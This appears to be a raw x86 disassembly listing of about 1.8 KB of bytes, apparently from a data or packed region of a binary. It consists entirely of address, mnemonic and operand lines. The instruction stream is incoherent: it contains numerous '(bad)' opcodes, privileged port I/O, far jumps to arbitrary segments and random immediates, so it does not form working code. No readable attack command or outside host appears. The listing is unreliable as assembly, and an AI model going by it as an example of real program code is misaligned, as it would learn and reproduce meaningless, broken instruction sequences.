  41c284:	idiv   DWORD PTR [edx-0x69]
  41c287:	or     al,0xa
  41c289:	rcr    DWORD PTR [edi],0x75
  41c28c:	call   0x136a:0xe2288870
  41c293:	and    BYTE PTR [eax+0x28],ch
  41c296:	and    al,0x9e
  41c298:	cs dec esp
  41c29a:	lock inc esi
  41c29c:	ror    BYTE PTR [ebp+0x78],0x12
  41c2a0:	retf   0xfd88
  41c2a3:	cld    
  41c2a4:	jae    0x41c2b5
  41c2a6:	cmp    bl,BYTE PTR [edx]
  41c2a8:	mov    ch,0x1
  41c2aa:	mov    DWORD PTR [ebx],ebx
  41c2ac:	aad    0x4a
  41c2ae:	cmp    al,0x73
  41c2b0:	jnp    0x41c2e5
  41c2b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2b3:	cld    
  41c2b4:	xchg   edi,eax
  41c2b5:	or     al,0x75
  41c2b7:	das    
  41c2b8:	leave  
  41c2b9:	pop    ebx
  41c2ba:	add    DWORD PTR [edx-0x6d],ebp
  41c2bd:	je     0x41c29b
  41c2bf:	adc    al,0x4a
  41c2c1:	sahf   
  41c2c2:	out    0xbf,al
  41c2c4:	and    eax,0xf971aaf3
  41c2c9:	cmp    eax,0xeecf5fd3
  41c2ce:	lods   al,BYTE PTR gs:[esi]
  41c2d0:	fld    DWORD PTR [ebx+ebp*2+0x55]
  41c2d4:	fnsave [esi-0x4e832afc]
  41c2da:	(bad)  
  41c2db:	pop    edi
  41c2dc:	cmp    DWORD PTR [eax+0x401ce41d],0xffffffb5
  41c2e3:	pop    es
  41c2e4:	xchg   ebx,eax
  41c2e5:	jp     0x41c29f
  41c2e7:	push   ebx
  41c2e8:	xchg   esp,eax
  41c2e9:	dec    ecx
  41c2ea:	jne    0x41c2ac
  41c2ec:	pop    esi
  41c2ed:	and    DWORD PTR [ebx+ebp*8],eax
  41c2f0:	arpl   WORD PTR [ecx],si
  41c2f2:	cmp    BYTE PTR [esi+ecx*2+0x47],dh
  41c2f6:	pop    ss
  41c2f7:	icebp  
  41c2f8:	adc    esi,DWORD PTR [esi-0x3f4eccd1]
  41c2fe:	iret   
  41c2ff:	in     eax,0x43
  41c301:	fcmovbe st,st(5)
  41c303:	enter  0x1daa,0xa4
  41c307:	mov    ds:0x72705de0,eax
  41c30c:	or     DWORD PTR [edi+eiz*8-0x11],ebp
  41c310:	xchg   esi,eax
  41c311:	and    ecx,esi
  41c313:	sbb    DWORD PTR [ecx-0x75],0xae47ccf5
  41c31a:	outs   dx,DWORD PTR ds:[esi]
  41c31b:	and    DWORD PTR [ebp+0x34],ebx
  41c31e:	pusha  
  41c31f:	in     al,dx
  41c320:	mov    ebx,0xfcf0ee2
  41c325:	mov    eax,0x392eeb37
  41c32a:	add    bh,BYTE PTR [ebx+0x49d10f1]
  41c330:	xchg   ecx,eax
  41c331:	jg     0x41c2f9
  41c333:	repz xchg ecx,eax
  41c335:	stos   DWORD PTR es:[edi],eax
  41c336:	fcmovnbe st,st(0)
  41c338:	pushf  
  41c339:	push   edi
  41c33a:	mov    bl,0x14
  41c33c:	and    al,0x9b
  41c33e:	test   DWORD PTR [ebx+0x26a200e1],ecx
  41c344:	push   ebx
  41c345:	iret   
  41c346:	in     eax,0x64
  41c348:	out    dx,eax
  41c349:	and    eax,ebp
  41c34b:	push   ds
  41c34c:	(bad)  
  41c34d:	(bad)  
  41c34e:	xchg   esi,eax
  41c34f:	mov    dl,0x1d
  41c351:	mov    esp,0x3e95b344
  41c356:	pop    edx
  41c357:	push   0x6d
  41c359:	es add al,0xe6
  41c35c:	mov    dl,0xe6
  41c35e:	mov    al,ds:0x3bd1c020
  41c363:	nop
  41c364:	adc    ax,0xf183
  41c368:	dec    edi
  41c369:	push   es
  41c36a:	test   al,0xbe
  41c36c:	push   edx
  41c36d:	add    DWORD PTR [esi-0x11d96031],eax
  41c373:	lds    ebp,FWORD PTR [ebx-0x18]
  41c376:	inc    ebx
  41c377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c378:	and    BYTE PTR [esi-0x1a],bl
  41c37b:	pop    es
  41c37c:	inc    ebx
  41c37d:	dec    ebx
  41c37e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c37f:	mov    al,0x23
  41c381:	mov    cl,bh
  41c383:	out    dx,eax
  41c384:	retf   0xd189
  41c387:	dec    eax
  41c388:	neg    BYTE PTR [eax]
  41c38a:	pop    eax
  41c38b:	shr    DWORD PTR [eax-0x2815ee58],cl
  41c391:	or     BYTE PTR [ecx],cl
  41c393:	test   BYTE PTR [ecx],ch
  41c395:	std    
  41c396:	loop   0x41c376
  41c398:	sbb    dh,ch
  41c39a:	push   edx
  41c39b:	std    
  41c39c:	pusha  
  41c39d:	xchg   esp,eax
  41c39e:	mov    edx,0x884e9e5b
  41c3a3:	xchg   edx,eax
  41c3a4:	sub    DWORD PTR [ebx+0x6eca9f09],ebx
  41c3aa:	adc    ah,0x1
  41c3ad:	push   cs
  41c3ae:	bound  esi,QWORD PTR [ebx+0x2b]
  41c3b1:	mov    cs,WORD PTR [eax]
  41c3b3:	inc    esi
  41c3b4:	dec    ecx
  41c3b5:	or     al,0x47
  41c3b7:	jo     0x41c372
  41c3b9:	div    BYTE PTR [esi]
  41c3bb:	mov    ds:0x460c0e01,eax
  41c3c0:	bswap  ecx
  41c3c2:	cwde   
  41c3c3:	hlt    
  41c3c4:	mov    edx,0xf9ca484b
  41c3c9:	out    dx,eax
  41c3ca:	stc    
  41c3cb:	inc    esi
  41c3cc:	mov    BYTE PTR [ebx-0x45],bl
  41c3cf:	add    eax,0x9d239bcb
  41c3d4:	sahf   
  41c3d5:	adc    DWORD PTR [eax+0x295c8439],edx
  41c3db:	jne    0x41c403
  41c3dd:	aam    0xd
  41c3df:	pushf  
  41c3e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3e1:	jge    0x41c3f0
  41c3e3:	sahf   
  41c3e4:	mov    ebp,0x7f6bb554
  41c3e9:	add    bh,ah
  41c3eb:	mov    ebx,0x562853be
  41c3f0:	xor    bh,ah
  41c3f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3f3:	add    eax,0x729292a4
  41c3f8:	jae    0x41c432
  41c3fa:	(bad)  
  41c3fb:	xchg   ecx,eax
  41c3fc:	push   ebx
  41c3fd:	adc    ebx,esi
  41c3ff:	int    0x56
  41c401:	mov    edi,0xd5374846
  41c406:	push   eax
  41c407:	sub    BYTE PTR [edi-0x5de392e8],dl
  41c40d:	pop    eax
  41c40e:	popa   
  41c40f:	pop    edx
  41c410:	sbb    edi,DWORD PTR [edi]
  41c412:	mov    ebp,0x5ac1542c
  41c417:	iret   
  41c418:	sub    DWORD PTR [edi],ecx
  41c41a:	jmp    0x8adb:0x374554c4
  41c421:	loop   0x41c41f
  41c423:	dec    ebx
  41c424:	call   FWORD PTR [bp+di]
  41c427:	dec    edi
  41c428:	dec    esi
  41c429:	cmp    al,0x40
  41c42b:	cmp    eax,0x21071bc2
  41c430:	lahf   
  41c431:	or     esp,ebp
  41c433:	mov    ebp,0xd58d6751
  41c438:	es jo  0x41c3ff
  41c43b:	mov    ebx,0x76f6806d
  41c440:	pop    ds
  41c441:	call   0xb0450d1b
  41c446:	jb     0x41c3df
  41c448:	push   edx
  41c449:	sbb    esi,DWORD PTR [ecx+0x28f6ae29]
  41c44f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c450:	mov    edi,0xa7324d99
  41c455:	lsl    eax,dx
  41c458:	inc    esp
  41c459:	aad    0x5f
  41c45b:	sub    DWORD PTR [ebp+0x39],ecx
  41c45e:	push   edx
  41c45f:	mov    dh,0xd0
  41c461:	retf   
  41c462:	dec    eax
  41c463:	push   ss
  41c464:	jle    0x41c423
  41c466:	dec    eax
  41c467:	cmp    eax,0xfe9a1e76
  41c46c:	leave  
  41c46d:	test   al,0xaa
  41c46f:	pop    esp
  41c470:	push   DWORD PTR [eax-0x24]
  41c473:	jo     0x41c40c
  41c475:	jo     0x41c41b
  41c477:	cwde   
  41c478:	retf   
  41c479:	mov    eax,0x1df61c8d
  41c47e:	jmp    0x6ba:0xa5b944b5
  41c485:	enter  0x776,0xc2
  41c489:	fwait
  41c48a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c48b:	pmaxub mm7,QWORD PTR [esi+eiz*8-0x55c2393e]
  41c493:	sbb    BYTE PTR [esi],bh
  41c495:	or     BYTE PTR [ebx],dl
  41c497:	mov    edi,0x3c667648
  41c49c:	sti    
  41c49d:	push   eax
  41c49e:	mov    bh,0x76
  41c4a0:	not    BYTE PTR [eax+0x8]
  41c4a3:	inc    edx
  41c4a4:	add    ecx,DWORD PTR [ebx+0xf]
  41c4a7:	sub    dh,bh
  41c4a9:	cld    
  41c4aa:	xchg   esp,eax
  41c4ab:	jl     0x41c43e
  41c4ad:	xor    dl,dh
  41c4af:	sub    BYTE PTR [eax-0x72],ah
  41c4b2:	xor    BYTE PTR [edi],0x49
  41c4b5:	in     al,0x9a
  41c4b7:	or     eax,0x971bbc99
  41c4bc:	dec    BYTE PTR ds:0xb2675378
  41c4c2:	cmp    eax,0x2e714d43
  41c4c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4c8:	jns    0x41c4df
  41c4ca:	dec    esp
  41c4cb:	not    BYTE PTR [ebx]
  41c4cd:	outs   dx,DWORD PTR ds:[esi]
  41c4ce:	xchg   edi,eax
  41c4cf:	xchg   BYTE PTR [ecx-0x1e],cl
  41c4d2:	and    eax,0x7615ee6c
  41c4d7:	push   0xdda0b667
  41c4dc:	cwde   
  41c4dd:	lahf   
  41c4de:	mov    esp,0xb8440719
  41c4e3:	out    0xac,eax
  41c4e5:	in     al,dx
  41c4e6:	outs   dx,BYTE PTR ds:[esi]
  41c4e7:	push   esp
  41c4e8:	sbb    eax,0xe25d884c
  41c4ed:	bound  ebp,QWORD PTR [ebx]
  41c4ef:	aas    
  41c4f0:	sub    ebx,DWORD PTR [esi+0x7e68e09]
  41c4f6:	lods   al,BYTE PTR ds:[esi]
  41c4f7:	xchg   ebp,eax
  41c4f8:	in     al,0x97
  41c4fa:	imul   ebp,DWORD PTR [edi+0x7de1620a],0x51
  41c501:	push   ebx
  41c502:	push   edx
  41c503:	in     al,0x8d
  41c505:	or     DWORD PTR [ebp-0x2a],ebp
  41c508:	(bad)  
  41c509:	pusha  
  41c50a:	repnz xor eax,0x3f559f03
  41c510:	add    al,0x23
  41c512:	inc    ebp
  41c513:	sahf   
  41c514:	xor    al,0x35
  41c516:	sub    al,0xcb
  41c518:	pop    ss
  41c519:	mov    edx,ebx
  41c51b:	sub    BYTE PTR [ecx-0x3c],al
  41c51e:	call   0xb857:0xba634d20
  41c525:	add    edx,esi
  41c527:	jl     0x41c58f
  41c529:	ret    0xfdf
  41c52c:	ds add al,0xbe
  41c52f:	pop    edx
  41c530:	jp     0x41c4c1
  41c532:	cmp    bl,BYTE PTR ds:0x1b6f6605
  41c538:	aad    0xfd
  41c53a:	je     0x41c55d
  41c53c:	in     al,dx
  41c53d:	sbb    al,0xf1
  41c53f:	dec    ebx
  41c540:	jecxz  0x41c4e4
  41c542:	(bad)  
  41c543:	fnstenv [ebp-0x53]
  41c546:	jl     0x41c4f9
  41c548:	outs   dx,BYTE PTR ds:[esi]
  41c549:	fs push edi
  41c54b:	clc    
  41c54c:	dec    eax
  41c54d:	sub    DWORD PTR fs:[edi+edx*4-0x5a],0x6f1c3593
  41c556:	enter  0x4957,0x6e
  41c55a:	mov    esi,0x49e65933
  41c55f:	rcl    BYTE PTR fs:[ebp+0x1b],1
  41c563:	pop    esp
  41c564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c565:	out    dx,eax
  41c566:	dec    edi
  41c567:	test   BYTE PTR [esi+0x30faedcb],ah
  41c56d:	jecxz  0x41c566
  41c56f:	mov    ah,0x33
  41c571:	pop    esp
  41c572:	out    0xba,eax
  41c574:	jmp    0xfa4b3f74
  41c579:	mov    BYTE PTR [ebp+ecx*1+0x3d],cl
  41c57d:	pop    ds
  41c57e:	into   
  41c57f:	cmovne ebp,DWORD PTR [edi+0x1b]
  41c583:	xor    DWORD PTR gs:[ebx+eiz*8-0x15],ecx
  41c588:	add    dl,BYTE PTR [esi-0x1ef32aed]
  41c58e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c58f:	daa    
  41c590:	sub    DWORD PTR [eax-0x3f5af10a],ebp
  41c596:	xor    dl,BYTE PTR [edi+0x715c84f2]
  41c59c:	fst    QWORD PTR [esi+0x5acaef49]
  41c5a2:	aaa    
  41c5a3:	jle    0xe7ebb37b
  41c5a9:	imul   esi,ebp,0x775a884e
  41c5af:	push   ebp
  41c5b0:	int    0xf8
  41c5b2:	outs   dx,DWORD PTR ds:[esi]
  41c5b3:	jle    0x41c631
  41c5b5:	cwde   
  41c5b6:	dec    eax
  41c5b7:	add    DWORD PTR [edx*8+0x43e855b1],ecx
  41c5be:	or     DWORD PTR [edi],esi
  41c5c0:	mov    al,0xe4
  41c5c2:	retf   
  41c5c3:	push   ds
  41c5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5c5:	sub    al,0xf7
  41c5c7:	xchg   ebx,eax
  41c5c8:	jmp    0xb9506ba0
  41c5cd:	ds mov bl,0x98
  41c5d0:	dec    esi
  41c5d1:	cmp    al,0xa6
  41c5d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5d4:	xor    DWORD PTR [ecx],edx
  41c5d6:	ret    
  41c5d7:	sbb    esi,DWORD PTR [esi+0x6bfee589]
  41c5dd:	bound  edi,QWORD PTR [edx+0x1ad30aeb]
  41c5e3:	cmp    al,0x76
  41c5e5:	imul   esp,ebp,0x89e0b00e
  41c5eb:	sbb    bh,dl
  41c5ed:	mov    DWORD PTR [edi+0x1ec1eb71],ebx
  41c5f3:	cmp    eax,0x19773c11
  41c5f8:	lods   eax,DWORD PTR ds:[esi]
  41c5f9:	push   ecx
  41c5fa:	sub    bl,cl
  41c5fc:	pop    ds
  41c5fd:	je     0x41c5c6
  41c5ff:	dec    ebx
  41c600:	fadd   QWORD PTR es:[edi]
  41c603:	cmc    
  41c604:	xchg   ecx,eax
  41c605:	ret    
  41c606:	push   0x4774e1d6
  41c60b:	fwait
  41c60c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c60d:	sti    
  41c60e:	popf   
  41c60f:	loope  0x41c689
  41c611:	rcl    DWORD PTR [ebp-0x33],0xcb
  41c615:	push   es
  41c616:	push   ebx
  41c617:	add    dl,ch
  41c619:	cs jge 0x41c63c
  41c61c:	ja     0x41c683
  41c61e:	stos   DWORD PTR es:[edi],eax
  41c61f:	shl    DWORD PTR [ecx+0x500f2fe9],1
  41c625:	jmp    0x41c618
  41c627:	and    al,0xe1
  41c629:	jge    0x41c697
  41c62b:	push   ebp
  41c62c:	xor    eax,0x3dc2a064
  41c631:	and    dl,BYTE PTR [ebp+0x7b]
  41c634:	iret   
  41c635:	cs sbb ebp,ebx
  41c638:	js     0x41c696
  41c63a:	sub    ebp,ecx
  41c63c:	or     ch,BYTE PTR [eax-0xd3b286d]
  41c642:	pusha  
  41c643:	pop    eax
  41c644:	mov    BYTE PTR [ebp+0x29fdaf83],dl
  41c64a:	adc    eax,0x16498f3a
  41c64f:	scas   al,BYTE PTR es:[edi]
  41c650:	xor    BYTE PTR [edi+0x1a281d53],dl
  41c656:	les    esi,FWORD PTR [ecx]
  41c658:	jmp    0xb834:0x4bbcc09f
  41c65f:	js     0x41c6d9
  41c661:	jbe    0x41c618
  41c663:	aad    0xdb
  41c665:	(bad)  
  41c666:	std    
  41c667:	sbb    al,0xfa
  41c669:	and    eax,0x36cbc57c
  41c66e:	mov    al,0xb6
  41c670:	sahf   
  41c671:	aas    
  41c672:	out    dx,al
  41c673:	pop    ecx
  41c674:	pop    ds
  41c675:	stc    
  41c676:	or     DWORD PTR [eax-0x3d9d3d1],esi
  41c67c:	sub    ah,bh
  41c67e:	in     al,0x91
  41c680:	inc    esi
  41c681:	stos   DWORD PTR es:[edi],eax
  41c682:	out    0x16,eax
  41c684:	or     al,0x9d
  41c686:	pushf  
  41c687:	les    esp,FWORD PTR [edi]
  41c689:	dec    esp
  41c68a:	cmp    BYTE PTR ds:0xf7a4c7e4,0xd9
  41c691:	add    eax,0xfc7086b3
  41c696:	mov    eax,0x56250d5d
  41c69b:	xchg   edi,eax
  41c69c:	pop    esi
  41c69d:	pop    esp
  41c69e:	xchg   DWORD PTR [edi+0x70],ebx
  41c6a1:	cdq    
  41c6a2:	fcom   QWORD PTR [edx-0x4f7315e5]
  41c6a8:	stos   DWORD PTR es:[edi],eax
  41c6a9:	xor    eax,DWORD PTR [eax]
  41c6ab:	sub    bl,ah
  41c6ad:	test   eax,0x4b52ca5
  41c6b2:	pop    ecx
  41c6b3:	and    eax,0xc0032912
  41c6b8:	mov    bl,bl
  41c6ba:	(bad)
  41c6bd:	sbb    eax,0x10bd08ca
  41c6c2:	add    eax,0x159e285a
  41c6c7:	xchg   esi,eax
  41c6c8:	xor    al,0x9a
  41c6ca:	xchg   DWORD PTR [edx+0x2fd2813a],eax
  41c6d0:	jecxz  0x41c6c7
  41c6d2:	rcr    BYTE PTR [ecx+0x150783a5],1
  41c6d8:	dec    ebp
  41c6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6da:	sub    eax,DWORD PTR [esi]
  41c6dc:	inc    esp
  41c6dd:	xchg   esp,eax
  41c6de:	sub    DWORD PTR [edi],esi
  41c6e0:	lea    esp,[esi]
  41c6e2:	inc    ecx
  41c6e3:	push   0x6b
  41c6e5:	retf   0x12f6
  41c6e8:	mov    dl,0x6b
  41c6ea:	retf   
  41c6eb:	je     0x41c6f6
  41c6ed:	sbb    eax,0xf8fefaf9
  41c6f2:	add    BYTE PTR [ecx-0x24],0x94
  41c6f6:	outs   dx,BYTE PTR ds:[esi]
  41c6f7:	xlat   BYTE PTR ds:[ebx]
  41c6f8:	dec    esi
  41c6f9:	test   BYTE PTR [ecx-0x1b],ch
  41c6fc:	mov    eax,ds:0x8aa739b0
  41c701:	push   es
  41c702:	mov    ecx,DWORD PTR [ebp+0x5f]
  41c705:	addr16 out dx,al
  41c707:	pop    ss
  41c708:	and    BYTE PTR [esi],bl
  41c70a:	je     0x41c719
  41c70c:	jb     0x41c784
  41c70e:	xchg   edi,eax
  41c70f:	cwde   
  41c710:	js     0x41c721
  41c712:	arpl   dx,cx
  41c714:	dec    eax
  41c715:	psubusw mm1,QWORD PTR [ebx]
  41c718:	sub    esp,DWORD PTR fs:[esi+0x75]
  41c71c:	aas    
  41c71d:	scas   eax,DWORD PTR es:[edi]
  41c71e:	pop    esp
  41c71f:	push   ecx
  41c720:	pop    esp
  41c721:	fist   WORD PTR [ebp+ecx*4+0x2f]
  41c725:	out    0xf,al
  41c727:	dec    edx
  41c728:	xor    ch,BYTE PTR [edi+0x4757d67d]
  41c72e:	sub    DWORD PTR ds:0xd5c5f4f4,ebx
  41c734:	jno    0x41c6bb
  41c736:	push   cs
  41c737:	mov    edx,DWORD PTR [esi+0x0]
  41c73a:	ins    BYTE PTR es:[edi],dx
  41c73b:	mov    WORD PTR [ecx+esi*2],cs
  41c73e:	mov    cl,0x3c
  41c740:	(bad)  
  41c741:	stc    
  41c742:	ret    0x833a
  41c745:	push   esp
  41c746:	popf   
  41c747:	inc    ecx
  41c748:	test   DWORD PTR [ecx],0x2f58d352
  41c74e:	leave  
  41c74f:	data16 das 
  41c751:	(bad)  
  41c752:	int3   
  41c753:	push   ebx
  41c754:	fidivr WORD PTR gs:[edx]
  41c757:	xor    eax,0x7cac84f1
  41c75c:	test   ebx,edi
  41c75e:	out    dx,al
  41c75f:	pop    esi
  41c760:	adc    esi,DWORD PTR es:[ebx-0x27ad6bde]
  41c767:	loopne 0x41c71c
  41c769:	xor    DWORD PTR [ebp+0x40],0xffffff99
  41c76d:	jmp    0x298f:0x1204a112
  41c774:	xor    ah,BYTE PTR [esp+edi*4-0x7e]
  41c778:	imul   ecx,ecx,0x6b
  41c77b:	mov    edx,0xfd58113f
  41c780:	cmp    ecx,DWORD PTR [ebx-0x14a33ee3]
  41c786:	(bad)  
  41c787:	ficomp DWORD PTR [esi]
  41c789:	adc    BYTE PTR [esp-0x4ca89a46],bh
  41c790:	sbb    DWORD PTR [ebx+0x29],esi
  41c793:	loop   0x41c750
  41c795:	enter  0xf00d,0x41
  41c799:	call   0x6315603
  41c79e:	call   DWORD PTR [esi-0x1c81b536]
  41c7a4:	out    dx,al
  41c7a5:	dec    eax
  41c7a6:	scas   eax,DWORD PTR es:[edi]
  41c7a7:	outs   dx,DWORD PTR ds:[esi]
  41c7a8:	arpl   WORD PTR [edx+0x55bab8ee],bp
  41c7ae:	xor    DWORD PTR [eax+esi*1-0x2cd9e816],0xffffffc4
  41c7b6:	mov    ebx,DWORD PTR [ebx+0x5745eef0]
  41c7bc:	jp     0x41c74d
  41c7be:	lea    esp,[ecx+eax*4]
  41c7c1:	mov    eax,ds:0xf68db00e
  41c7c6:	push   ds
  41c7c7:	sbb    DWORD PTR [edx-0x61],esp
  41c7ca:	jle    0x41c837
  41c7cc:	(bad)  
  41c7cd:	shr    BYTE PTR [ecx-0x761e5d55],cl
  41c7d3:	xchg   esp,eax
  41c7d4:	lahf   
  41c7d5:	push   0x53
  41c7d7:	push   ebx
  41c7d8:	in     al,dx
  41c7d9:	mov    ds:0x678b35ed,al
  41c7de:	je     0x41c82e
  41c7e0:	sub    al,0x10
  41c7e2:	ja     0x41c818
  41c7e4:	stos   DWORD PTR es:[edi],eax
  41c7e5:	mov    edi,0x8d78f70e
  41c7ea:	pop    ds
  41c7eb:	mov    ch,0x5
  41c7ed:	pop    ecx
  41c7ee:	jb     0x41c82a
  41c7f0:	rcl    BYTE PTR [eax-0x43],0x26
  41c7f4:	ins    BYTE PTR es:[edi],dx
  41c7f5:	sub    bl,BYTE PTR [ecx]
  41c7f7:	cmp    dh,BYTE PTR [esi]
  41c7f9:	adc    dl,BYTE PTR [esi]
  41c7fb:	leave  
  41c7fc:	sahf   
  41c7fd:	pop    ecx
  41c7fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7ff:	xor    dh,BYTE PTR [ecx-0x222cf2a8]
  41c805:	test   eax,ecx
  41c807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c808:	test   eax,0x2d450d3c
  41c80d:	and    DWORD PTR [edi-0x74],0x7c
  41c811:	jg     0x41c817
  41c813:	sub    al,0x26
  41c815:	jp     0x41c7e0
  41c817:	dec    edx
  41c818:	jl     0x41c82a
  41c81a:	repz shl BYTE PTR [edi-0x37],0xf2
  41c81f:	add    edx,DWORD PTR [edi-0xb904d47]
  41c825:	jl     0x41c83d
  41c827:	push   ebp
  41c828:	cmp    dl,BYTE PTR [ecx]
  41c82a:	mov    esi,0x556b0514
  41c82f:	xlat   BYTE PTR ds:[ebx]
  41c830:	and    dl,BYTE PTR [edi]
  41c832:	pop    edx
  41c833:	(bad)  
  41c834:	(bad)  
  41c835:	in     al,0xba
  41c837:	lea    esi,[ebx+eax*1+0x690e81c5]
  41c83e:	push   esp
  41c83f:	jge    0x41c82e
  41c841:	mov    cl,0x35
  41c843:	stc    
  41c844:	cmp    dh,BYTE PTR [edx]
  41c846:	xchg   edi,eax
  41c847:	les    eax,FWORD PTR [ebp+0x42]
  41c84a:	sub    dh,BYTE PTR [esi+0x2c]
  41c84d:	push   esp
  41c84e:	in     eax,0x1
  41c850:	popa   
  41c851:	aam    0x3a
  41c853:	mov    ds:0xed45ae06,al
  41c858:	inc    ebp
  41c859:	sbb    bl,bl
  41c85b:	hlt    
  41c85c:	lods   al,BYTE PTR ds:[esi]
  41c85d:	retf   
  41c85e:	test   edx,ebx
  41c860:	imul   ebx,DWORD PTR [esi],0xffffffc9
  41c863:	ret    
  41c864:	mov    esi,0x8e8840a7
  41c869:	(bad)  
  41c86b:	enter  0x85f8,0x3d
  41c86f:	ret    0x8857
  41c872:	mov    dh,0x3a
  41c874:	call   0xfe42:0xab96897c
  41c87b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c87c:	mov    ds:0x2203b9f9,al
  41c881:	xchg   ecx,eax
  41c882:	push   ds
  41c883:	in     al,dx
  41c884:	add    edi,ebp
  41c886:	(bad)  
  41c887:	fstp   QWORD PTR [eax]
  41c889:	lods   eax,DWORD PTR ds:[si]
  41c88b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c88c:	push   eax
  41c88d:	call   0xdebe:0xc14a8245
  41c894:	xchg   ebx,eax
  41c895:	push   ebp
  41c896:	enter  0xb8f8,0x46
  41c89a:	jmp    0x41c902
  41c89c:	cmp    DWORD PTR [ebx],esi
  41c89e:	shr    cl,1
  41c8a0:	add    BYTE PTR [ebx],al
  41c8a2:	jecxz  0x41c8cf
  41c8a4:	arpl   bx,di
  41c8a6:	jge    0x41c914
  41c8a8:	mov    dh,0x81
  41c8aa:	and    eax,0x283b5af7
  41c8af:	jp     0x41c921
  41c8b1:	lods   eax,DWORD PTR ds:[esi]
  41c8b2:	lods   al,BYTE PTR ds:[esi]
  41c8b3:	lods   eax,DWORD PTR ds:[esi]
  41c8b4:	scas   eax,DWORD PTR es:[edi]
  41c8b5:	loope  0x41c876
  41c8b7:	push   esp
  41c8b8:	mov    dl,BYTE PTR [edi]
  41c8ba:	and    al,0x97
  41c8bc:	and    al,BYTE PTR [edi]
  41c8be:	cmp    eax,0xaf8ec8b8
  41c8c3:	xor    al,0x34
  41c8c5:	dec    ebx
  41c8c6:	sub    BYTE PTR [esi-0x6a],bl
  41c8c9:	and    al,0xe1
  41c8cb:	in     eax,dx
  41c8cc:	scas   eax,DWORD PTR es:[edi]
  41c8cd:	call   0xf8ecef3d
  41c8d2:	pusha  
  41c8d3:	or     DWORD PTR [edi+edi*4-0x36048c32],edx
  41c8da:	repz add ebp,DWORD PTR [edx-0x43]
  41c8de:	jecxz  0x41c8e3
  41c8e0:	push   0x1a
  41c8e2:	out    0x59,eax
  41c8e4:	adc    dh,BYTE PTR [ebx]
  41c8e6:	rcr    BYTE PTR [ebp-0x10],1
  41c8e9:	mov    ds,edx
  41c8eb:	inc    ebx
  41c8ec:	adc    edi,DWORD PTR ds:0x6e51d997
  41c8f2:	(bad)
  41c8f7:	jnp    0x41c8e8
  41c8f9:	or     al,0x23
  41c8fb:	xor    BYTE PTR [edi-0x29],0x17
  41c8ff:	pop    ecx
  41c900:	sti    
  41c901:	push   ecx
  41c902:	outs   dx,BYTE PTR ds:[esi]
  41c903:	cld    
  41c904:	in     al,0x2c
  41c906:	xor    dh,bh
  41c908:	mov    DWORD PTR [esi+esi*8-0x6d72fe49],ecx
  41c90f:	out    0x13,al
  41c911:	out    0xf,eax
  41c913:	dec    BYTE PTR [edx+0x248c4654]
  41c919:	push   edx
  41c91a:	cmp    ebp,esp
  41c91c:	mov    edi,0xe7458f6b
  41c921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c922:	(bad)  
  41c923:	mov    DWORD PTR [eax],eax
  41c925:	gs mov ebp,0x7ab26b6e
  41c92c:	cld    
  41c92d:	outs   dx,BYTE PTR ds:[esi]
  41c92e:	dec    ebp
  41c92f:	push   cs
  41c930:	xor    DWORD PTR [edx],ecx
  41c932:	outs   dx,DWORD PTR ds:[esi]
  41c933:	sub    BYTE PTR [edi-0x63],al
  41c936:	jno    0x41c909
  41c938:	jle    0x41c99b
  41c93a:	add    eax,0xf0a9e850
  41c93f:	ficom  WORD PTR [edi]
  41c941:	mov    al,0x3b
  41c943:	sbb    eax,0x153e30b2
  41c948:	xchg   edi,eax
  41c949:	dec    esi
  41c94a:	mov    DWORD PTR [ebx],eax
  41c94c:	add    ch,0x52
  41c94f:	dec    eax
  41c950:	pop    eax
  41c951:	mov    ah,0x7b
  41c953:	popa   
  41c954:	add    DWORD PTR [eax],eax
  41c956:	sub    al,0xef
  41c958:	sbb    eax,0x39eb58bb
  41c95d:	(bad)  
  41c95e:	in     eax,dx
  41c95f:	and    esp,DWORD PTR [ebp+0x62421e86]
  41c965:	adc    al,0x58
  41c967:	mov    esi,0x6dc95e3e
  41c96c:	xchg   ebp,eax
  41c96d:	aaa    
  41c96e:	loopne 0x41c987
  41c970:	fadd   st(1),st
  41c972:	push   eax
  41c973:	not    BYTE PTR [ebp-0x44]
  41c976:	and    al,BYTE PTR [edx+eax*8-0x5]
  41c97a:	jge    0x41c9e6
  41c97c:	lds    ebx,FWORD PTR [ebx+eax*1-0x12fb206e]
  41c983:	or     cl,BYTE PTR [esi+0x5f2562d7]
  41c989:	pop    edx
  41c98a:	test   BYTE PTR [esi-0x5a1e0972],0x6a
  41c991:	(bad)  
  41c992:	jle    0x41c98b
  41c994:	sbb    DWORD PTR [esi+0x2a0102f9],edx
  41c99a:	mov    cl,0x13
  41c99c:	mul    DWORD PTR [edi+0x4876be44]
  41c9a2:	outs   dx,DWORD PTR ds:[esi]
  41c9a3:	adc    ebx,esi
  41c9a5:	pop    esi
  41c9a7:	imul   edi,edx,0xf2d02aec
  41c9ad:	add    DWORD PTR [eax],ebx
  41c9af:	cmp    al,0x7d
  41c9b1:	add    esp,DWORD PTR ds:0xceb5cfd7
  41c9b7:	lock outs dx,BYTE PTR ds:[esi]
  41c9b9:	adc    ah,BYTE PTR [edi-0x631539e7]
  41c9bf:	fsubr  st(0),st
  41c9c1:	mov    cl,0x38
  41c9c3:	mov    fs,esp
  41c9c5:	push   ss
  41c9c6:	sub    BYTE PTR [edx],dh
  41c9c8:	ret    
